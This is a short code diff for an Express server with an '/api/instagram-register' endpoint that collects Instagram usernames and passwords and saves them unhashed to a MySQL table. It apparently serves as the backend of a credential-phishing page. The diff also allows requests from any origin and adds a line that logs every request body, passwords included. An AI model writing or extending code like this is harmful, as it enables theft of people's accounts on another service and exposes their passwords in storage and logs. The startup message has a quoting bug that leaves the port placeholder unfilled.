@@ -6,7 +6,11 @@ import cors from "cors";
 dotenv.config();
 
 const app = express();
-app.use(cors());
+app.use(cors({
+  origin: "*",
+  methods: ["GET", "POST"],
+  allowedHeaders: ["Content-Type"]
+}));
 app.use(express.json());
 
 // MySQL connection
@@ -40,6 +44,8 @@ app.post("/api/register", (req, res) => {
 
 /* Instagram Registration */
 app.post("/api/instagram-register", (req, res) => {
+  console.log("Instagram API hit:", req.body);
+
   const { username, password } = req.body;
 
   if (!username || !password) {
@@ -50,12 +56,14 @@ app.post("/api/instagram-register", (req, res) => {
     "INSERT INTO instagram_details (username, password) VALUES (?, ?)",
     [username, password],
     err => {
-      if (err) return res.status(500).json({ message: "Database error" });
+      if (err) {
+        console.error("DB error:", err);
+        return res.status(500).json({ message: "Database error" });
+      }
       res.json({ message: "Saved" });
     }
   );
 });
-
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log("🚀 Server running on port ${PORT}");
